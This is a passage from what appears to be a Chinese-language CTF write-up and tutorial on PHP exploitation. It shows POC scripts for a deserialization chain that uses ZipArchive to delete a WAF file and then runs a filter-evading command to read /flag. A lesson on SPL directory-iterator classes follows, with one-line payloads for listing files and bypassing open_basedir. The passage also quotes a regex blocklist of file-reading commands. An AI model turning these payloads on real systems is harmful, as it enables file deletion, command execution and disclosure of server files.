invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>shell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到function<code>shell</code>，所以我们可以通过反序列化，来调用shell方法，然后执行<code>system</code>来命令执行</p>
<p>这儿遇到一个问题，open的方法，当waf.txt不存在时，我们才能调用shell方法，我们需要删除waf.txt,想到了原生类,且需要原生类中有open方法，去删除waf.txt.</p>
<p>遍历一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>找到了<code>ZipArchive::open</code></p>
<p>如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>)</span><br></pre></td></tr></table></figure>
<p>删除waf.txt的POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;<span class="comment">//或者为8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>删除后，我们直接构造命令执行，也需要绕过正则</p>
<p>我们这种只需要用<code>''</code>或者<code>\</code>来过滤即可</p>
<p>POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;n\l /flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<h4 id="php-原生文件操作类"><a class="markdownIt-Anchor" href="#php-原生文件操作类"></a> PHP 原生文件操作类</h4>
<h5 id="spl"><a class="markdownIt-Anchor" href="#spl"></a> SPL</h5>
<p>SPL是php标准库</p>
<p><a href="https://www.php.net/manual/zh/book.spl.php">PHP: SPL - Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SPL 对 PHP 引擎进行了扩展，例如 <span class="built_in">ArrayAccess</span>、<span class="built_in">Countable</span> 和 <span class="built_in">SeekableIterator</span> 等接口，它们用于以数组形式操作对象。同时，你还可以使用 <span class="built_in">RecursiveIterator</span>、ArrayObejcts 等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、<span class="built_in">SplObserver</span>、Spltorage 以及 splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率</span><br></pre></td></tr></table></figure>
<h5 id="遍历文件目录的类"><a class="markdownIt-Anchor" href="#遍历文件目录的类"></a> 遍历文件目录的类</h5>
<ul>
<li>DirectoryIterator 类</li>
<li>FilesystemIterator 类</li>
<li>GlobIterator 类</li>
</ul>
<h5 id="directoryiterator-类"><a class="markdownIt-Anchor" href="#directoryiterator-类"></a> DirectoryIterator 类</h5>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">current</span> ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getATime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getBasename</span> ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getCTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getExtension</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getFilename</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getGroup</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getInode</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getMTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getOwner</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPath</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPathname</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPerms</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getSize</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getType</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDir</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDot</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isExecutable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isFile</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isLink</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isReadable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isWritable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">seek</span> ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span>    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">valid</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>遍历文件目录,直接对文件全部输出出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</p>
<blockquote>
<p>glob:// 协议用来查找匹配的文件路径模式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;glob:///flag&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
<h5 id="filesystemiterator-类"><a class="markdownIt-Anchor" href="#filesystemiterator-类"></a> FilesystemIterator 类</h5>
<p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p>都是一样的，我们就列举一个</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接对文件目录全部输出出来。</p>
<h5 id="globiterator类"><a class="markdownIt-Anchor" href="#globiterator类"></a> GlobIterator类</h5>
<p>GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">GlobIterator</span> <span class="keyword">extends</span> <span class="built_in">FilesystemIterator</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> , <span class="built_in">Countable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">count</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="comment">/* 继承的方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">SKIP_DOTS</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">current</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">getFlags</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">setFlags</span> ( <span class="keyword">int</span> <span class="variable">$flags</span> = ? ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 <code>__toString()</code> 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。</p>
<p>意思就是我们可以在<code>GlobIterator</code>中直接使用正则匹配路径来遍历目录</p>
<p>遍历目录全部文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="使用可遍历目录类绕过-open_basedir"><a class="markdownIt-Anchor" href="#使用可遍历目录类绕过-open_basedir"></a> 使用可遍历目录类绕过 open_basedir</h5>
<p>关于绕过open_basedir()可以看看<a href="https://blog.csdn.net/Xxy605/article/details/120221577">这个文章</a></p>
<h5 id="使用directoryiterator类"><a class="markdownIt-Anchor" href="#使用directoryiterator类"></a> 使用DirectoryIterator类</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用filesystemiterator"><a class="markdownIt-Anchor" href="#使用filesystemiterator"></a> 使用FilesystemIterator</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用-globiterator-类"><a class="markdownIt-Anchor" href="#使用-globiterator-类"></a> 使用 GlobIterator 类</h5>
